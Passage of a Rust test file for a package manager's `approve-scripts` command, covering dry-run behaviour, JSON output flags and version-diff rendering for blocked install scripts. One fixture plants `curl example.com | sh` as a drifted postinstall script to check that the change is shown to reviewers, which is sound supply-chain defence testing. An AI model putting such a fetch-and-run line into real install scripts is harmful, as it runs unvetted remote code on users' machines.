//! Workflow tests for `lpm approve-scripts`.
//!
//! `--dry-run` previews approval decisions without
//! mutating state. Project mode leaves `package.json` byte-equal;
//! global mode leaves `~/.lpm/global/trusted-dependencies.json`
//! byte-equal (or absent). JSON envelopes carry `"dry_run": true` so
//! agents can detect the mode uniformly across every approve-scripts
//! sub-mode (`--yes`, named, `--list`, empty-set short-circuit).
//!
//! These tests exercise both project + global mutation surfaces
//! end-to-end through subprocess. The contract: byte-equality of the
//! would-be-mutated file before and after the command, PLUS
//! `"dry_run": true` on the JSON envelope.
//!
//! The interactive walks (no `--yes`, no `<pkg>`, no `--list`) are not
//! subprocess-testable without TTY emulation — those live as cli/tests
//! survivors in `approve_scripts_audit_regression.rs` (kept post-6.5
//! for the TTY subset only).

mod support;

use std::path::PathBuf;
use support::assertions;
use support::build_state::{
    seed_blocked_build_state_with_real_hash, seed_global_install_blocked_state_with_real_hash,
};
use support::{TempProject, lpm, write_signed_unlock};

// ─── Project-mode fixture helpers ───────────────────────────────────────

/// Write a project `package.json` with no `trustedDependencies`.
/// First-time review scenario: the diff surface is empty so
/// `approve-scripts` is purely mutating (pre-fix) or purely previewing
/// (post-fix).
fn write_project_no_trusted_deps(project: &TempProject) {
    project.write_file(
        "package.json",
        r#"{
    "name": "approve-scripts-fixture",
    "version": "0.0.1"
}
"#,
    );
}

// Project-mode build-state.json seeding lives in
// `support::build_state::seed_blocked_build_state_with_real_hash`
// (finding D). The helper stages a real store entry and computes the
// hash via `lpm_security::script_hash::compute_script_hash`, so a
// future test that adds a `lpm rebuild` step doesn't trip the
// finding #75 BindingDrift footgun.

/// Synthesize an empty blocked-set build-state — exercises the
/// short-circuit branch in `approve_scripts::run`.
fn write_empty_build_state(project: &TempProject) {
    project.write_file(
        ".lpm/build-state.json",
        r#"{
    "state_version": 1,
    "blocked_set_fingerprint": "sha256-empty",
    "captured_at": "2026-04-22T00:00:00Z",
    "blocked_packages": []
}"#,
    );
}

// ─── Global-mode fixture helpers ────────────────────────────────────────

/// Write a minimal `<home>/.lpm/global/manifest.toml` with one
/// globally-installed top-level package. Matches the on-disk shape
/// produced by `lpm_global::write_for`.
fn write_global_manifest(project: &TempProject, top_level: &str, top_level_version: &str) {
    let global_root = project.home().join(".lpm").join("global");
    std::fs::create_dir_all(&global_root).unwrap();
    let toml = format!(
        r#"schema_version = 1

[packages.{top_level}]
saved_spec = "^1"
resolved = "{top_level_version}"
integrity = "sha512-fixture-top-level"
source = "upstream-npm"
installed_at = "2026-04-22T00:00:00Z"
root = "installs/{top_level}@{top_level_version}"
commands = []
"#
    );
    std::fs::write(global_root.join("manifest.toml"), toml).unwrap();
}

// Global-install build-state.json seeding lives in
// `support::build_state::seed_global_install_blocked_state_with_real_hash`
// (finding D — same rationale as the project-mode helper above).

/// Path to the global trust file. Absence in the fresh-fixture state
/// is the baseline; byte-equal assertion verifies it's still absent
/// (or carries the pre-seeded contents) after `--dry-run`.
fn global_trust_path(project: &TempProject) -> PathBuf {
    project
        .home()
        .join(".lpm")
        .join("global")
        .join("trusted-dependencies.json")
}

// ─── Project-mode dry-run tests ─────────────────────────────────────────

/// `approve-scripts --yes --dry-run --json` must NOT mutate
/// `package.json`. JSON envelope carries `"dry_run": true`. Bulk-yes
/// path: pre-fix, the `write_back` call fires unconditionally.
#[test]
fn approve_scripts_yes_dry_run_does_not_mutate_package_json_and_json_carries_flag() {
    let project = TempProject::empty("");
    write_project_no_trusted_deps(&project);
    seed_blocked_build_state_with_real_hash(&project, "some-blocked-pkg", "1.0.0");

    let pkg_json_path = project.path().join("package.json");
    let before = std::fs::read(&pkg_json_path).unwrap();

    let out = lpm(&project)
        .args(["--json", "approve-scripts", "--yes", "--dry-run"])
        .output()
        .expect("spawn lpm approve-scripts");
    assert!(
        out.status.success(),
        "--yes --dry-run --json must exit 0; stdout:\n{}\nstderr:\n{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );

    let after = std::fs::read(&pkg_json_path).unwrap();
    assert_eq!(
        before, after,
        "package.json must be byte-equal before and after --yes --dry-run"
    );

    let stdout = String::from_utf8_lossy(&out.stdout);
    let parsed: serde_json::Value = serde_json::from_str(stdout.trim())
        .unwrap_or_else(|e| panic!("valid JSON on stdout expected: {e}\nstdout:\n{stdout}"));
    assert_eq!(parsed["success"].as_bool(), Some(true));
    assert_eq!(parsed["dry_run"].as_bool(), Some(true));
    assert_eq!(parsed["approved_count"].as_u64(), Some(1));

    // The --yes warning must reframe as DRY RUN under --dry-run — the
    // text shape is what agents parse to distinguish preview vs live.
    let warnings = parsed["warnings"].as_array().expect("warnings array");
    let first_msg = warnings
        .first()
        .and_then(|w| w.get("message"))
        .and_then(|m| m.as_str())
        .unwrap_or("");
    assert!(
        first_msg.contains("DRY RUN"),
        "--yes warning must reframe as DRY RUN under --dry-run; warning={first_msg}"
    );
}

#[test]
fn approve_scripts_yes_json_reports_rebuild_next_step_when_approved() {
    let project = TempProject::empty("");
    write_project_no_trusted_deps(&project);
    seed_blocked_build_state_with_real_hash(&project, "some-blocked-pkg", "1.0.0");
    write_signed_unlock(&project, &["trust-bulk-approve"]);

    let out = lpm(&project)
        .args(["--json", "approve-scripts", "--yes"])
        .output()
        .expect("spawn lpm approve-scripts --yes");
    assert!(
        out.status.success(),
        "--yes --json must exit 0 after signed unlock; stdout:\n{}\nstderr:\n{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr),
    );

    let parsed: serde_json::Value =
        serde_json::from_str(String::from_utf8_lossy(&out.stdout).trim()).unwrap();
    assert_eq!(parsed["success"].as_bool(), Some(true));
    assert_eq!(parsed["approved_count"].as_u64(), Some(1));
    assert_eq!(
        parsed["next_steps"][0]["description"].as_str(),
        Some("Run approved lifecycle scripts")
    );
    assert_eq!(
        parsed["next_steps"][0]["command"].as_str(),
        Some("lpm rebuild")
    );
}

/// `approve-scripts <pkg> --dry-run --json` (named-approve path) must
/// NOT mutate `package.json`. Pre-fix, the `write_back` call after
/// auto-confirm fires unconditionally.
#[test]
fn approve_scripts_named_dry_run_does_not_mutate_package_json() {
    let project = TempProject::empty("");
    write_project_no_trusted_deps(&project);
    seed_blocked_build_state_with_real_hash(&project, "some-blocked-pkg", "1.0.0");

    let pkg_json_path = project.path().join("package.json");
    let before = std::fs::read(&pkg_json_path).unwrap();

    let out = lpm(&project)
        .args(["--json", "approve-scripts", "some-blocked-pkg", "--dry-run"])
        .output()
        .expect("spawn lpm approve-scripts");
    assert!(out.status.success(), "exit 0 expected");

    let after = std::fs::read(&pkg_json_path).unwrap();
    assert_eq!(
        before, after,
        "package.json must be byte-equal before and after <pkg> --dry-run"
    );

    let stdout = String::from_utf8_lossy(&out.stdout);
    let parsed: serde_json::Value = serde_json::from_str(stdout.trim()).unwrap();
    assert_eq!(parsed["dry_run"].as_bool(), Some(true));
    assert_eq!(parsed["approved_count"].as_u64(), Some(1));
}

/// `--list --dry-run` is a silent no-op (`--list` is already read-only
/// — `--dry-run` on top is accepted silently). The JSON envelope must
/// carry `"dry_run": true` for schema uniformity. Plain `--list`
/// emits `"dry_run": false` as the regression baseline.
#[test]
fn approve_scripts_list_dry_run_is_silent_no_op_with_uniform_dry_run_flag() {
    let project = TempProject::empty("");
    write_project_no_trusted_deps(&project);
    seed_blocked_build_state_with_real_hash(&project, "some-blocked-pkg", "1.0.0");

    let pkg_json_path = project.path().join("package.json");
    let before = std::fs::read(&pkg_json_path).unwrap();

    // Plain --list --json: dry_run: false baseline.
    let out_plain = lpm(&project)
        .args(["--json", "approve-scripts", "--list"])
        .output()
        .expect("spawn lpm approve-scripts --list");
    assert!(
        out_plain.status.success(),
        "plain --list --json must succeed"
    );
    let parsed_plain: serde_json::Value =
        serde_json::from_str(String::from_utf8_lossy(&out_plain.stdout).trim()).unwrap();
    assert_eq!(
        parsed_plain["dry_run"].as_bool(),
        Some(false),
        "plain --list --json must carry `dry_run: false` for schema uniformity; envelope={parsed_plain}"
    );

    // --list --dry-run --json: flag flips to true.
    let out_dry = lpm(&project)
        .args(["--json", "approve-scripts", "--list", "--dry-run"])
        .output()
        .expect("spawn lpm approve-scripts --list --dry-run");
    assert!(
        out_dry.status.success(),
        "--list --dry-run --json must succeed"
    );
    let parsed_dry: serde_json::Value =
        serde_json::from_str(String::from_utf8_lossy(&out_dry.stdout).trim()).unwrap();
    assert_eq!(
        parsed_dry["dry_run"].as_bool(),
        Some(true),
        "--list --dry-run --json envelope must carry `dry_run: true`; envelope={parsed_dry}"
    );

    let after = std::fs::read(&pkg_json_path).unwrap();
    assert_eq!(before, after, "--list never mutates, dry-run or not");
}

/// Empty-blocked-set short-circuit envelope conforms to the universal
/// dry_run schema. Pins that the inline envelope emitted by the
/// `effective_state.blocked_packages.is_empty()` branch carries the
/// flag uniformly, not just `print_summary`'s output.
#[test]
fn approve_scripts_empty_blocked_set_envelope_carries_dry_run_flag() {
    let project = TempProject::empty("");
    write_project_no_trusted_deps(&project);
    write_empty_build_state(&project);

    // dry-run off: dry_run: false.
    let out_off = lpm(&project)
        .args(["--json", "approve-scripts", "--yes"])
        .output()
        .expect("spawn lpm approve-scripts --yes");
    assert!(out_off.status.success());
    let parsed_off: serde_json::Value =
        serde_json::from_str(String::from_utf8_lossy(&out_off.stdout).trim()).unwrap();
    assert_eq!(parsed_off["success"].as_bool(), Some(true));
    assert_eq!(parsed_off["blocked_count"].as_u64(), Some(0));
    assert_eq!(parsed_off["dry_run"].as_bool(), Some(false));

    // dry-run on: dry_run: true.
    let out_on = lpm(&project)
        .args(["--json", "approve-scripts", "--yes", "--dry-run"])
        .output()
        .expect("spawn lpm approve-scripts --yes --dry-run");
    assert!(out_on.status.success());
    let parsed_on: serde_json::Value =
        serde_json::from_str(String::from_utf8_lossy(&out_on.stdout).trim()).unwrap();
    assert_eq!(parsed_on["blocked_count"].as_u64(), Some(0));
    assert_eq!(
        parsed_on["dry_run"].as_bool(),
        Some(true),
        "empty-set short-circuit envelope must carry dry_run: true; envelope={parsed_on}"
    );
}

// ─── Global-mode dry-run tests ──────────────────────────────────────────

/// Bulk-global: `approve-scripts --global --yes --dry-run --json` must
/// NOT mutate `~/.lpm/global/trusted-dependencies.json`. Pre-fix, the
/// `lpm_global::trusted_deps::write_for` call inside `run_global_bulk_yes`
/// fires unconditionally.
#[test]
fn approve_scripts_global_yes_dry_run_does_not_mutate_trust_file_and_json_carries_flag() {
    let project = TempProject::empty("");
    write_global_manifest(&project, "some-top-level", "1.0.0");
    seed_global_install_blocked_state_with_real_hash(
        &project,
        "some-top-level",
        "1.0.0",
        "some-blocked-pkg",
        "2.0.0",
    );

    let trust_path = global_trust_path(&project);
    assert!(
        !trust_path.exists(),
        "pre-condition: trust file must not exist before the test"
    );

    let out = lpm(&project)
        .args([
            "--json",
            "approve-scripts",
            "--global",
            "--yes",
            "--dry-run",
        ])
        .output()
        .expect("spawn lpm approve-scripts --global --yes --dry-run");
    assert!(
        out.status.success(),
        "--yes --global --dry-run --json must exit 0; stdout:\n{}",
        String::from_utf8_lossy(&out.stdout)
    );

    assert!(
        !trust_path.exists(),
        "trusted-dependencies.json must stay absent under --dry-run"
    );

    let parsed: serde_json::Value =
        serde_json::from_str(String::from_utf8_lossy(&out.stdout).trim()).unwrap();
    assert_eq!(parsed["success"].as_bool(), Some(true));
    assert_eq!(parsed["dry_run"].as_bool(), Some(true));
    assert_eq!(parsed["scope"].as_str(), Some("global"));
    assert_eq!(parsed["approved_count"].as_u64(), Some(1));

    let warnings = parsed["warnings"].as_array().expect("warnings array");
    assert!(
        warnings
            .first()
            .and_then(|w| w.as_str())
            .is_some_and(|s| s.contains("DRY RUN")),
        "global --yes warning must reframe as DRY RUN; warnings={warnings:?}"
    );
}

/// Named-global: `approve-scripts --global <pkg>@<version> --dry-run`
/// must NOT mutate the global trust file. Pre-fix, `write_for` inside
/// `run_global_named` fires unconditionally.
#[test]
fn approve_scripts_global_named_dry_run_does_not_mutate_trust_file() {
    let project = TempProject::empty("");
    write_global_manifest(&project, "some-top-level", "1.0.0");
    seed_global_install_blocked_state_with_real_hash(
        &project,
        "some-top-level",
        "1.0.0",
        "some-blocked-pkg",
        "2.0.0",
    );

    let trust_path = global_trust_path(&project);
    assert!(!trust_path.exists(), "pre-condition: trust file absent");

    let out = lpm(&project)
        .args([
            "--json",
            "approve-scripts",
            "--global",
            "some-blocked-pkg@2.0.0",
            "--dry-run",
        ])
        .output()
        .expect("spawn lpm approve-scripts --global <pkg> --dry-run");
    assert!(out.status.success(), "exit 0 expected");

    assert!(
        !trust_path.exists(),
        "trusted-dependencies.json must stay absent under <pkg> --global --dry-run"
    );

    let parsed: serde_json::Value =
        serde_json::from_str(String::from_utf8_lossy(&out.stdout).trim()).unwrap();
    assert_eq!(parsed["dry_run"].as_bool(), Some(true));
    assert_eq!(parsed["scope"].as_str(), Some("global"));
    assert_eq!(parsed["approved_count"].as_u64(), Some(1));

    // Sanity: the matched candidate's identity carries through.
    let approved = parsed["approved"].as_array().expect("approved array");
    assert_eq!(approved.len(), 1);
    assert_eq!(approved[0]["name"].as_str(), Some("some-blocked-pkg"));
    assert_eq!(approved[0]["version"].as_str(), Some("2.0.0"));
}

/// Pre-seeded trust file stays byte-equal under `--dry-run` —
/// confirms the short-circuit protects existing state, not just the
/// fresh-file case.
#[test]
fn approve_scripts_global_named_dry_run_preserves_pre_seeded_trust_file_byte_equal() {
    let project = TempProject::empty("");
    write_global_manifest(&project, "some-top-level", "1.0.0");
    seed_global_install_blocked_state_with_real_hash(
        &project,
        "some-top-level",
        "1.0.0",
        "some-blocked-pkg",
        "2.0.0",
    );

    // Pre-seed the trust file with an unrelated entry so byte-equal
    // is a meaningful assertion.
    let trust_path = global_trust_path(&project);
    let seeded = r#"{
  "schema_version": 1,
  "trusted": {
    "unrelated@9.9.9": {
      "integrity": "sha512-pre-seeded",
      "script_hash": "sha256-pre-seeded"
    }
  }
}
"#;
    std::fs::write(&trust_path, seeded).unwrap();
    let before = std::fs::read(&trust_path).unwrap();

    let out = lpm(&project)
        .args([
            "--json",
            "approve-scripts",
            "--global",
            "some-blocked-pkg@2.0.0",
            "--dry-run",
        ])
        .output()
        .expect("spawn lpm approve-scripts --global <pkg> --dry-run");
    assert!(out.status.success(), "exit 0 expected");

    let after = std::fs::read(&trust_path).unwrap();
    assert_eq!(
        before, after,
        "pre-seeded trusted-dependencies.json must be byte-equal under --dry-run"
    );
}

/// `--list --global --json` envelope carries `dry_run` uniformly
/// (false plain, true under --dry-run) so agents read the flag
/// without branching on which subcommand produced the output.
#[test]
fn approve_scripts_global_list_json_carries_dry_run_flag_on_both_axes() {
    let project = TempProject::empty("");
    write_global_manifest(&project, "some-top-level", "1.0.0");
    seed_global_install_blocked_state_with_real_hash(
        &project,
        "some-top-level",
        "1.0.0",
        "some-blocked-pkg",
        "2.0.0",
    );

    // Plain --list --global --json: dry_run: false baseline.
    let out_plain = lpm(&project)
        .args(["--json", "approve-scripts", "--global", "--list"])
        .output()
        .expect("spawn lpm approve-scripts --global --list");
    assert!(out_plain.status.success());
    let parsed_plain: serde_json::Value =
        serde_json::from_str(String::from_utf8_lossy(&out_plain.stdout).trim()).unwrap();
    assert_eq!(parsed_plain["scope"].as_str(), Some("global"));
    assert_eq!(
        parsed_plain["dry_run"].as_bool(),
        Some(false),
        "plain --list --global --json must carry `dry_run: false`; envelope={parsed_plain}"
    );

    // --dry-run on top: flips to true.
    let out_dry = lpm(&project)
        .args([
            "--json",
            "approve-scripts",
            "--global",
            "--list",
            "--dry-run",
        ])
        .output()
        .expect("spawn lpm approve-scripts --global --list --dry-run");
    assert!(out_dry.status.success());
    let parsed_dry: serde_json::Value =
        serde_json::from_str(String::from_utf8_lossy(&out_dry.stdout).trim()).unwrap();
    assert_eq!(parsed_dry["scope"].as_str(), Some("global"));
    assert_eq!(
        parsed_dry["dry_run"].as_bool(),
        Some(true),
        "--list --global --dry-run --json envelope must carry `dry_run: true`; envelope={parsed_dry}"
    );
}

#[test]
fn approve_scripts_global_yes_fails_when_blocked_set_is_incomplete() {
    let project = TempProject::empty("");
    write_global_manifest(&project, "missing-state-global", "1.0.0");

    let out = lpm(&project)
        .args(["--json", "approve-scripts", "--global", "--yes"])
        .output()
        .expect("spawn lpm approve-scripts --global --yes");

    assert!(
        !out.status.success(),
        "global --yes must fail when missing build-state makes the aggregate incomplete\nstdout:\n{}\nstderr:\n{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr),
    );
    let parsed = assertions::parse_json_output(&out.stdout);
    assert_eq!(parsed["success"], serde_json::json!(false));
    let error = parsed["error"].to_string();
    assert!(
        error.contains("missing-state-global") && error.contains("build-state"),
        "error must name the unreadable global origin and build-state problem: {parsed}",
    );
}

#[test]
fn approve_scripts_global_named_empty_set_fails_as_not_found() {
    let project = TempProject::empty("");

    let out = lpm(&project)
        .args(["--json", "approve-scripts", "--global", "not-blocked-pkg"])
        .output()
        .expect("spawn lpm approve-scripts --global not-blocked-pkg");

    assert!(
        !out.status.success(),
        "global named approval of an empty blocked set must fail, not return a generic empty-set success\nstdout:\n{}\nstderr:\n{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr),
    );
    let parsed = assertions::parse_json_output(&out.stdout);
    assert_eq!(parsed["success"], serde_json::json!(false));
    let error = parsed["error"].to_string();
    assert!(
        error.contains("not-blocked-pkg") && error.contains("global blocked set"),
        "error must name the requested package and the global blocked set: {parsed}",
    );
}

#[test]
fn approve_scripts_named_bare_package_fails_when_multiple_versions_are_blocked() {
    let project = TempProject::empty(r#"{"name":"approve-scripts-ambiguous","version":"0.0.0"}"#);
    write_build_state_audit(
        &project,
        &[
            (
                "multi-version-pkg",
                "1.0.0",
                "sha512-multi-v1",
                "sha256-multi-v1",
            ),
            (
                "multi-version-pkg",
                "2.0.0",
                "sha512-multi-v2",
                "sha256-multi-v2",
            ),
        ],
    );

    let out = lpm(&project)
        .args([
            "--json",
            "approve-scripts",
            "multi-version-pkg",
            "--dry-run",
        ])
        .output()
        .expect("spawn lpm approve-scripts multi-version-pkg --dry-run");

    assert!(
        !out.status.success(),
        "bare-name approval must fail when multiple blocked versions match\nstdout:\n{}\nstderr:\n{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr),
    );
    let parsed = assertions::parse_json_output(&out.stdout);
    assert_eq!(parsed["success"], serde_json::json!(false));
    let error = parsed["error"].to_string();
    assert!(
        error.contains("ambiguous")
            && error.contains("multi-version-pkg@1.0.0")
            && error.contains("multi-version-pkg@2.0.0"),
        "error must explain ambiguity and list disambiguating candidates: {parsed}",
    );
}

// ─── version-diff rendering on `--list` ────────────
//
// Ship criteria for approve-scripts:
//  1. Script-hash drift surfaces the EXACT added line in the unified
//     diff (`+curl example.com | sh`) — human + JSON.
//  2. Behavioral-tag delta surfaces gained tags (`+ network`, `+ eval`)
//     in human; gained/lost arrays in JSON.
//
// Diff renderer is shared with the install pre-autobuild card; passing
// here proves both sites' rendering contract.

/// Strip ANSI escapes; UTF-8-safe.
fn strip_ansi(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\u{1b}' && chars.peek() == Some(&'[') {
            chars.next();
            for cc in chars.by_ref() {
                let cb = cc as u32;
                if (0x40..=0x7e).contains(&cb) {
                    break;
                }
            }
        } else {
            out.push(c);
        }
    }
    out
}

/// Seed `<store>/v1/<safe>@<v>/` with package.json carrying the given
/// postinstall body. Returns the store directory path. Uses
/// `serde_json::Value::String` for the postinstall body so multi-line
/// scripts (with `\n`) survive into the JSON payload.
fn seed_store_pkg_with_postinstall(
    project: &TempProject,
    name: &str,
    version: &str,
    postinstall: &str,
) -> std::path::PathBuf {
    let safe = name.replace(['/', '\\'], "+");
    let dir = project
        .store_dir()
        .join("v1")
        .join(format!("{safe}@{version}"));
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(
        dir.join("package.json"),
        format!(
            r#"{{"name":"{name}","version":"{version}","scripts":{{"postinstall":{}}}}}"#,
            serde_json::Value::String(postinstall.into())
        ),
    )
    .unwrap();
    std::fs::write(dir.join(".integrity"), "sha512-fixture-skip-verify").unwrap();
    dir
}

/// Synthesize `.lpm/build-state.json` with one blocked entry carrying
/// optional behavioral-tag drift signal. Used by the version-diff
/// tests where the candidate v2's `script_hash` and/or
/// `behavioral_tags` differ from the binding in `package.json`.
fn write_blocked_build_state_with_drift(
    project: &TempProject,
    name: &str,
    version: &str,
    script_hash: &str,
    behavioral_tags: Option<&[&str]>,
    behavioral_tags_hash: Option<&str>,
) {
    let tags_block = match (behavioral_tags, behavioral_tags_hash) {
        (Some(tags), Some(hash)) => format!(
            r#""behavioral_tags": {}, "behavioral_tags_hash": "{}","#,
            serde_json::to_string(tags).unwrap(),
            hash,
        ),
        _ => String::new(),
    };
    let body = format!(
        r#"{{
            "state_version": 1,
            "blocked_set_fingerprint": "sha256-fixture-stable",
            "captured_at": "2026-04-22T00:00:00Z",
            "blocked_packages": [
                {{
                    "name": "{name}",
                    "version": "{version}",
                    "integrity": "sha512-fixture-skip-verify",
                    "script_hash": "{script_hash}",
                    "phases_present": ["postinstall"],
                    "binding_drift": false,
                    "static_tier": "green",
                    {tags_block}
                    "published_at": "2026-04-22T00:00:00Z"
                }}
            ]
        }}"#
    );
    project.write_file(".lpm/build-state.json", &body);
}

/// Write `package.json` with a `trustedDependencies` rich entry for
/// the **prior** approved version. Optional behavioral-tag fields are
/// `behavioralTagsHash` and `behavioralTags`.
fn write_project_with_prior_binding(
    project: &TempProject,
    pkg_name: &str,
    prior_version: &str,
    prior_script_hash: &str,
    prior_behavioral_tags: Option<&[&str]>,
    prior_behavioral_tags_hash: Option<&str>,
) {
    let prior_tags_block = match (prior_behavioral_tags, prior_behavioral_tags_hash) {
        (Some(tags), Some(hash)) => format!(
            r#","behavioralTagsHash":"{}","behavioralTags":{}"#,
            hash,
            serde_json::to_string(tags).unwrap(),
        ),
        _ => String::new(),
    };
    let body = format!(
        r#"{{
            "name": "approve-scripts-version-diff-fixture",
            "version": "0.0.1",
            "lpm": {{
                "trustedDependencies": {{
                    "{pkg_name}@{prior_version}": {{
                        "integrity": "sha512-fixture-skip-verify",
                        "scriptHash": "{prior_script_hash}"
                        {prior_tags_block}
                    }}
                }}
            }}
        }}"#
    );
    project.write_file("package.json", &body);
}

// ─── Ship criterion 1: script-hash drift surfaces exact added line ──────

/// `lpm approve-scripts --list` against a script-hash drifted package
/// renders a unified-diff card containing the LITERAL added line
/// (`+curl example.com | sh`) plus the phase header
/// (`scripts.postinstall`). The diff renderer is shared with the
/// install pre-autobuild card.
#[test]
fn approve_scripts_list_surfaces_exact_added_line_on_script_hash_drift() {
    let project = TempProject::empty("");
    seed_store_pkg_with_postinstall(&project, "shapeshift", "1.0.0", "echo hi");
    seed_store_pkg_with_postinstall(
        &project,
        "shapeshift",
        "2.0.0",
        "echo hi\ncurl example.com | sh",
    );
    write_project_with_prior_binding(
        &project,
        "shapeshift",
        "1.0.0",
        "sha256-shapeshift-v1-fixture",
        None,
        None,
    );
    write_blocked_build_state_with_drift(
        &project,
        "shapeshift",
        "2.0.0",
        "sha256-shapeshift-v2-fixture",
        None,
        None,
    );

    let out = lpm(&project)
        .args(["approve-scripts", "--list"])
        .output()
        .expect("spawn lpm approve-scripts --list");
    let stdout = strip_ansi(&String::from_utf8_lossy(&out.stdout));
    let stderr = strip_ansi(&String::from_utf8_lossy(&out.stderr));
    assert!(
        out.status.success(),
        "approve-scripts --list must exit 0; stdout:\n{stdout}\nstderr:\n{stderr}"
    );

    assert!(
        stdout.contains("shapeshift@2.0.0 — changes since v1.0.0:"),
        "diff card header must name candidate + prior version; stdout:\n{stdout}"
    );
    assert!(
        stdout.contains("+curl example.com | sh"),
        "ship criterion 1: literal added line must appear verbatim in the diff card; stdout:\n{stdout}"
    );
    assert!(
        stdout.contains("scripts.postinstall"),
        "phase header must surface so user knows which phase changed; stdout:\n{stdout}"
    );
}

/// Same scenario, JSON channel: `version_diff` carries
/// `reason: "script-hash-drift"`, `script_hash_drift: true`, and the
/// prior + candidate versions. Tag-shift fields null. SCHEMA_VERSION 3.
#[test]
fn approve_scripts_list_json_emits_structured_version_diff_on_script_hash_drift() {
    let project = TempProject::empty("");
    seed_store_pkg_with_postinstall(&project, "shapeshift", "1.0.0", "echo hi");
    seed_store_pkg_with_postinstall(
        &project,
        "shapeshift",
        "2.0.0",
        "echo hi\ncurl example.com | sh",
    );
    write_project_with_prior_binding(
        &project,
        "shapeshift",
        "1.0.0",
        "sha256-shapeshift-v1-fixture",
        None,
        None,
    );
    write_blocked_build_state_with_drift(
        &project,
        "shapeshift",
        "2.0.0",
        "sha256-shapeshift-v2-fixture",
        None,
        None,
    );

    let out = lpm(&project)
        .args(["--json", "approve-scripts", "--list"])
        .output()
        .expect("spawn lpm approve-scripts --json");
    let stdout = strip_ansi(&String::from_utf8_lossy(&out.stdout));
    assert!(out.status.success());

    let parsed: serde_json::Value = serde_json::from_str(stdout.trim()).unwrap_or_else(|e| {
        panic!("approve-scripts --list --json must be parseable: {e}\nstdout:\n{stdout}")
    });

    assert_eq!(parsed["success"].as_bool(), Some(true));
    assert_eq!(parsed["schema_version"].as_u64(), Some(3));
    let blocked = parsed["blocked"]
        .as_array()
        .expect("blocked must be an array");
    assert_eq!(blocked.len(), 1);
    let entry = &blocked[0];
    assert_eq!(entry["name"], serde_json::json!("shapeshift"));
    assert_eq!(entry["version"], serde_json::json!("2.0.0"));

    let vd = &entry["version_diff"];
    assert!(
        vd.is_object(),
        "version_diff must be object when prior binding exists; entry={entry}"
    );
    assert_eq!(vd["reason"], serde_json::json!("script-hash-drift"));
    assert_eq!(vd["prior_version"], serde_json::json!("1.0.0"));
    assert_eq!(vd["candidate_version"], serde_json::json!("2.0.0"));
    assert_eq!(vd["script_hash_drift"], serde_json::json!(true));
    assert!(vd["behavioral_tags_added"].is_null());
    assert!(vd["behavioral_tags_removed"].is_null());
    assert!(vd["provenance_drift_kind"].is_null());
}

// ─── Ship criterion 2: behavioral-tag delta surfaces ────────────────────

/// Behavioral-tag-only drift (script bodies identical) surfaces gained
/// tags as `+ <name>` lines. Sorted lex order — `eval` before
/// `network`. No "Script content changed" header (script bodies match).
#[test]
fn approve_scripts_list_surfaces_gained_behavioral_tags_when_tags_only_drift() {
    let project = TempProject::empty("");
    seed_store_pkg_with_postinstall(&project, "creep", "1.0.0", "node build.js");
    seed_store_pkg_with_postinstall(&project, "creep", "2.0.0", "node build.js");
    write_project_with_prior_binding(
        &project,
        "creep",
        "1.0.0",
        "sha256-creep-script-same",
        Some(&["crypto"]),
        Some("sha256-creep-tags-v1"),
    );
    write_blocked_build_state_with_drift(
        &project,
        "creep",
        "2.0.0",
        "sha256-creep-script-same",
        Some(&["crypto", "eval", "network"]),
        Some("sha256-creep-tags-v2"),
    );

    let out = lpm(&project)
        .args(["approve-scripts", "--list"])
        .output()
        .expect("spawn lpm approve-scripts --list");
    let stdout = strip_ansi(&String::from_utf8_lossy(&out.stdout));
    assert!(
        out.status.success(),
        "approve-scripts --list must exit 0; stdout:\n{stdout}"
    );

    assert!(
        stdout.contains("creep@2.0.0 — changes since v1.0.0:"),
        "diff card header missing; stdout:\n{stdout}"
    );
    assert!(
        stdout.contains("+ eval"),
        "ship criterion 2: `+ eval` must appear when candidate gained the eval tag; stdout:\n{stdout}"
    );
    assert!(
        stdout.contains("+ network"),
        "ship criterion 2: `+ network` must appear when candidate gained the network tag; stdout:\n{stdout}"
    );
    assert!(
        !stdout.contains("Script content changed"),
        "tag-only drift must NOT emit script-content section when bodies are identical; stdout:\n{stdout}"
    );
}

/// JSON channel for the tag-only drift: `version_diff.reason =
/// "behavioral-tag-shift"`, `script_hash_drift: false`, gained array
/// in lex order, removed = `[]` (NOT null — distinguishes "drifted
/// with no losses" from "didn't drift").
#[test]
fn approve_scripts_list_json_emits_gained_arrays_on_behavioral_tag_drift() {
    let project = TempProject::empty("");
    seed_store_pkg_with_postinstall(&project, "creep", "1.0.0", "node build.js");
    seed_store_pkg_with_postinstall(&project, "creep", "2.0.0", "node build.js");
    write_project_with_prior_binding(
        &project,
        "creep",
        "1.0.0",
        "sha256-creep-script-same",
        Some(&["crypto"]),
        Some("sha256-creep-tags-v1"),
    );
    write_blocked_build_state_with_drift(
        &project,
        "creep",
        "2.0.0",
        "sha256-creep-script-same",
        Some(&["crypto", "eval", "network"]),
        Some("sha256-creep-tags-v2"),
    );

    let out = lpm(&project)
        .args(["--json", "approve-scripts", "--list"])
        .output()
        .expect("spawn lpm approve-scripts --json");
    let stdout = strip_ansi(&String::from_utf8_lossy(&out.stdout));
    assert!(out.status.success());

    let parsed: serde_json::Value = serde_json::from_str(stdout.trim())
        .unwrap_or_else(|e| panic!("invalid JSON: {e}\nstdout:\n{stdout}"));
    let entry = &parsed["blocked"][0];
    let vd = &entry["version_diff"];
    assert_eq!(vd["reason"], serde_json::json!("behavioral-tag-shift"));
    assert_eq!(vd["script_hash_drift"], serde_json::json!(false));
    assert_eq!(
        vd["behavioral_tags_added"],
        serde_json::json!(["eval", "network"]),
        "tags_added must be the gained set in lex order; vd={vd}"
    );
    assert_eq!(
        vd["behavioral_tags_removed"],
        serde_json::json!([]),
        "tags_removed must be `[]` (not null) — drifted, no losses; vd={vd}"
    );
}

// ─── Stream-separation + first-time-review controls ────────────────────

/// `--list --json` produces ONE valid JSON document on stdout. Catches
/// regressions where a `println!` from the diff card renderer leaks
/// into the JSON-mode stdout and breaks `JSON.parse` for agents.
#[test]
fn approve_scripts_list_json_stays_parseable_with_version_diff_enrichment() {
